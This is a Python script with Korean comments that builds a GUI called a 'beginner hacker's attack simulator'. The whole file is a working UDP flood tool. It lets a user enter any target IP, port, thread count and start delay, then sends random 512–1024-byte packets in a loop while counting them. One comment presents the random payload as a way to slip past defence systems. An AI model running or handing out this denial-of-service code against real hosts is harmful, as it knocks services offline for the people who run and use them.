import socket      # 네트워크로 데이터를 보내는 도구
import time        # 기다리는 시간(예약)을 만들 때 사용
import threading   # 공격하면서 화면도 안 멈추게 '멀티태스킹' 하는 도구
import tkinter as tk # 윈도우 창 만드는 도구
import os          # 무작위(랜덤) 데이터 조각을 만드는 도구
import random      # 숫자를 무작위로 뽑을 때 사용

# --- 전역 변수 (프로그램 전체에서 사용하는 변수들) ---
running = False    # 공격이 돌아가는 중인지 확인하는 스위치
packet_count = 0   # 보낸 패킷 개수를 담아둘 바구니

# --- 기능 함수 (버튼을 누르면 실행되는 일들) ---

def attack_logic():
    """실제로 패킷을 쏘고 숫자를 세는 핵심 부분"""
    global packet_count # 밖에 있는 packet_count를 수정하겠다는 뜻

    # 입력창에서 주소랑 포트 번호를 가져옴
    target_ip = ip_input.get()
    target_port = int(port_input.get())

    # 통신 준비 (UDP 방식)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while running: # 스위치가 켜져 있는 동안 무한 반복
        try:
            # [해커 팁] 방어 시스템이 눈치채지 못하게 아무 의미 없는 무작위 데이터 생성
            payload = os.urandom(random.randint(512, 1024))

            # 목표 지점으로 발사!
            client.sendto(payload, (target_ip, target_port))

            # 패킷 하나 보낼 때마다 숫자 1씩 올리기
            packet_count += 1

            # 화면에 있는 노란 글씨(카운트)를 실시간으로 바꿈
            count_label.config(text=f"전송된 패킷: {packet_count}개")

            # 너무 빨리 쏘면 컴퓨터가 힘들어하니까 0.001초만 쉬기
            time.sleep(0.001)
        except:
            break
    client.close()

def start_process():
    """예약 시간을 기다렸다가 공격을 시작하는 함수"""
    global running, packet_count
    running = True      # 스위치 ON
    packet_count = 0    # 시작할 때 카운트 0으로 초기화

    try:
        # 입력한 시간을 가져와서 대기하기
        wait_time = int(time_input.get())
        if unit_var.get() == "분":
            wait_time *= 60 # '분'이면 60을 곱해서 초로 바꿈

        log_box.insert("end", f"[*] {wait_time}초 뒤에 공격을 시작합니다...\n")
        log_box.see("end")
        time.sleep(wait_time) # 예약한 시간만큼 멍하니 기다림

        # 화력(스레드)을 몇 개 쓸지 정함
        thread_count = int(thread_input.get())
        log_box.insert("end", f"[!] 공격 개시! (화력: {thread_count})\n")
        log_box.see("end")

        # 설정한 화력만큼 공격 함수를 동시에 실행!
        for _ in range(thread_count):
            # daemon=True는 창을 끄면 공격도 자동으로 멈추게 함
            threading.Thread(target=attack_logic, daemon=True).start()

    except ValueError:
        log_box.insert("end", "[에러] 숫자만 넣어주세요!\n")

def stop_attack():
    """멈추기 버튼을 눌렀을 때"""
    global running
    running = False # 스위치 OFF (반복문이 멈춤)
    log_box.insert("end", "[!] 공격 중단 명령 전송됨.\n")
    log_box.see("end")

# --- 화면 UI 만들기 ---

root = tk.Tk()
root.title("초보 해커의 공격 시뮬레이터")
root.geometry("350x600") # 창 크기 설정
root.configure(bg="#000000") # 배경은 해커처럼 검정색

# 글자랑 입력창 스타일 정하기
lbl_style = {"bg": "#000000", "fg": "#00FF00", "font": ("Courier", 10)}
ent_style = {"bg": "#222222", "fg": "#00FF00", "insertbackground": "#00FF00", "relief": "flat"}

# [실시간 카운터] 노란색으로 강조해서 화면 맨 위에 배치
count_label = tk.Label(root, text="전송된 패킷: 0개", bg="#000000", fg="#FFFF00", font=("Courier", 15, "bold"))
count_label.pack(pady=20)

# IP, 포트, 화력 등 입력창들 배치
tk.Label(root, text="대상 IP 주소", **lbl_style).pack()
ip_input = tk.Entry(root, **ent_style, width=25)
ip_input.insert(0, "127.0.0.1")
ip_input.pack(pady=5)

tk.Label(root, text="대상 포트 번호", **lbl_style).pack()
port_input = tk.Entry(root, **ent_style, width=25)
port_input.insert(0, "9999")
port_input.pack(pady=5)

tk.Label(root, text="동시 화력 (스레드)", **lbl_style).pack()
thread_input = tk.Entry(root, **ent_style, width=25)
thread_input.insert(0, "5")
thread_input.pack(pady=5)

tk.Label(root, text="시작 예약 (대기 시간)", **lbl_style).pack()
time_input = tk.Entry(root, **ent_style, width=10)
time_input.insert(0, "3")
time_input.pack(pady=5)

# 초/분 선택 버튼
unit_var = tk.StringVar(value="초")
tk.Radiobutton(root, text="초(sec)", variable=unit_var, value="초", **lbl_style, selectcolor="black").pack()
tk.Radiobutton(root, text="분(min)", variable=unit_var, value="분", **lbl_style, selectcolor="black").pack()

# 작업 내용이 보이는 로그 창
log_box = tk.Text(root, height=6, bg="#111111", fg="#00FF00", font=("Courier", 8), relief="flat")
log_box.pack(pady=10, padx=10)

# 버튼들 (공격 시작과 중단)
# 클릭했을 때 화면이 안 멈추게 threading.Thread를 사용함
tk.Button(root, text="[ 작전 시작 ]", bg="#003300", fg="#00FF00", width=25, relief="flat",
          command=lambda: threading.Thread(target=start_process, daemon=True).start()).pack(pady=5)

tk.Button(root, text="[ 공격 중단 ]", bg="#330000", fg="#FF0000", width=25, relief="flat",
          command=stop_attack).pack(pady=5)

root.mainloop() # 창 실행